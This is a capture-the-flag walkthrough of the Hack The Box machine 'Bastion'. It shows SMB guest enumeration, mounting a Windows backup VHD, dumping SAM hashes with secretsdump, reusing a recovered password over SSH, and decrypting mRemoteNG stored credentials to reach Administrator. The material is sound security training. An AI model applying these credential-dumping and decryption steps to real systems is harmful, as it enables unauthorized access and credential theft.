Add target machine ip to `/etc/hosts` to bind it to domain. It will become easier to access ip without knowing it.

```bash
nano /etc/hosts
```

![[HackTheBox/Bastion/images/1.png]]

Check whether the target accessible or not via `ping` command. It is enough to send only 4 ICMP request it. Otherwise, it will loop unlimitedly.

```bash
ping -c 4 bastion.htb
```

![[HackTheBox/Bastion/images/2.png]]

Conduct port scan:

```bash
sudo nmap -sV -sC --max-rate 10000 bastion.htb
```

Results were fascinating ! 

SMB guest mode enabled + OS version is identical (even two OS details given)

![[HackTheBox/Bastion/images/3.png]]

Let me use `NetExec` guideline to reach `SMB` shares:

I tried empty creds demonstrated as `Guest Logon` scan:

```bash
nxc smb 10.129.136.29 -u '' -p '' --shares
```

It gave error

![[HackTheBox/Bastion/images/4.png]]

Default usage:

```bash
nxc smb 10.129.136.29
```

![[HackTheBox/Bastion/images/5.png]]

Because `guest` account is enabled, I'll attempt to enumerate via `guest` as username.

![[HackTheBox/Bastion/images/6.png]]

Add `--shares` as parameter to retrieve shares' information.

![[HackTheBox/Bastion/images/7.png]]

As you can see above, I have `READ` and `WRITE` permissions respectively. I will dive on `Backups` share first.

Meanwhile,  you can use `--shares READ,WRITE` parameter to filter only shares with `READ,WRITE` .

![[HackTheBox/Bastion/images/8.png]]

Here `NetExec` explains how we can authenticate if we find user:pass combination

[SMB AUTH](https://www.netexec.wiki/smb-protocol/authentication/checking-credentials-domain)

In my case, the `Bastion\guest` may work as expected:

```bash
SMB         10.129.136.29   445    BASTION          [+] Bastion\guest:
```

,but still I have DOMAIN:USER:PASS (PASS as empty).

By using `--users` we can enumerate users:

`nxc smb 10.129.136.29 -u 'guest' -p '' --users`

![[HackTheBox/Bastion/images/9.png]]

I used `spider_plus` module to list everything located on guest share. Then identified a `note.txt` file.

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' -M spider_plus
```

![[HackTheBox/Bastion/images/11.png]]


![[HackTheBox/Bastion/images/10.png]]


Using default `--spider` option you can get a list of files by filtering their extensions.

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' --spider Backups --pattern txt
```

![[HackTheBox/Bastion/images/12.png]]

Let's download `note.txt` to `/tmp/` directory:

```bash
nxc smb 10.129.136.29 -u 'guest' -p '' --share Backups --get-file note.txt /tmp/note.txt
```

![[HackTheBox/Bastion/images/13.png]]

In note it refers not to download `backup` file entirely because it slows vpn:

![[HackTheBox/Bastion/images/14.png]]

There must be a file `5.05 GB` total ,so let's check if there is another method to reach other files located on `Backups` share.

![[15.png]]

I noticed the file in spider_plus module log file:

![[16.png]]

I found such a valuable resource about `.vhd` virtual hard disk files.

[VHD](https://www.techtarget.com/searchvirtualdesktop/definition/virtual-hard-disk-VHD#:~:text=A%20virtual%20hard%20disk%20(VHD)%20is%20a%20disk%20image%20file,%2C%20i.e.%2C%20to%20create%20VMs.)

A guy from Reddit mentions like that

[RedditGuy](https://www.reddit.com/r/Windows11/comments/120wluy/is_a_vm_required_to_downloadinstall_vhds/#:~:text=You%20don't%20need%20a,files%2C%20like%20a%20ZIP%20file.&text=Ah%20okay%2C%20thanks%20for%20clearing,%22Downloads%22%20in%20File%20Explorer?&text=Yes%20indeed%2C%20it'll%20be,a%20regular%20file%20in%20Downloads.&text=Ah%20okay%2C%20thank%20you%20very,I%20accidentally%20installed%20some%20malware.&text=In%20doubt%2C%207%2Dzip.,ico%20icon.&text=I%20have%207%2Dzip%2C%20so,where%20could%20I%20find%20it?&text=In%20your%20downloads%20folder?&text=Oh%20okay%2C%20so%20that%20means,VHD%20in%20my%20downloads%20folder.&text=FYI%2C%20you%20don't%20need,disk%20file%20to%20do%20this.&text=Ah%20okay%2C%20good%20to%20know,the%20post%2C%20thanks%20for%20this.)

`FYI, you don't need to install a VM or use 7-Zip or any other archiving tool to work with VHDs. Windows can mount them natively and they will look like another physical disk on your PC. Right click on the virtual disk file to do this.`

On this article, the mentioned technique used to mount share virtual disk file:

[Mounting VHD file](https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25)

First mount locally:

```bash
mkdir /mnt/remote
```

```bash
mount -t cifs //10.129.136.29/Backups /mnt/remote -o rw
```

I could not reach without giving creds ,so I found ubuntu blog about it.

[mount cifs usage](https://askubuntu.com/questions/101029/how-do-i-mount-a-cifs-share)

```bash
mount -t cifs -o username='guest',password='' //10.129.136.29/Backups /mnt/remote -o rw
```

Now it works !

![[17.png]]

I saw image fie on `bastion_smb` share directly:

![[18.png]]

Let's use Medium article's recommended command:

```bash
guestmount --add /mnt/remote/path/to/vhdfile.vhd --inspector --ro /mnt/vhd -v
```

I identified related disk file in `L4mpje-PC`'s directory: 

![[19.png]]

```bash
guestmount --add /mnt/bastion_smb/WindowsImageBackup/L4mpje-PC/'Backup 2019-02-22 124351'/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/vhd -v
```

we don't have direct OS access instead we have OS backup ,so simply the machine asking for to dump user:pass belonging to backup.

I found a valuable article about how to dump CREDS belongs to SAM:

[secretsdump](https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary)

To run the tool:

```bash
$ secretsdump.py -sam sam -security security -system system local
```

Here it is 

[The paths for SAM SYSTEM SECURITY](https://github.com/v4resk/red-book/blob/main/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets.md)

Let's jump here:

```bash
\system32\config\sam
\system32\config\security
\system32\config\system
```

Let's get them:

![[20.png]]

```bash

cp SAM SYSTEM SECURITY /home/kali

python secrets.py -sam SAM -security SECURITY -system SYSTEM local
```

![[21.png]]

I also ran the tool directly `impacket` because I got error on SAM hash extraction phase.

![[22.png]]

Since the user is unknown, I will try its default pass on `SSH`.

It works clearly:

`ssh L4mpje@bastion.htb`

pass: `bureaulampje`

Get flag from `C:\Users\L4mpje\Desktop\`

![[23.png]]

I could not find anything related to get admin. I did not enumerate OS info so as to decide proper version of `winpeas`.

I also wanted to check custom programs not Windows based ones.

![[24.png]]

It is a remote desktop controller application

[mremoteng](https://mremoteng.org/)

In this installation guide, it refers to the path:

https://yurisk.info/2025/02/16/mremoteng-initial-set-up-and-usage/

`C:\Users\<User>\AppData\Roaming\mRemoteNG\confCons.xml`

![[25.png]]


There is such a long password here:

![[26.png]]

Most likely encrypted because I found this repo while wandering on GitHub ->

[Decrypting mRemoteNG](https://github.com/gquere/mRemoteNG_password_decrypt)

Lets copy the creds file to our machine

`scp L4mpje@10.129.136.29:"C:/Users/L4mpje/AppData/Roaming/mRemoteNG/confCons.xml" .`

![[27.png]]

Now auth as Admin and get Root flag from Desktop:

```bash
ssh Administrator@10.129.136.29
```

![[28.png]]

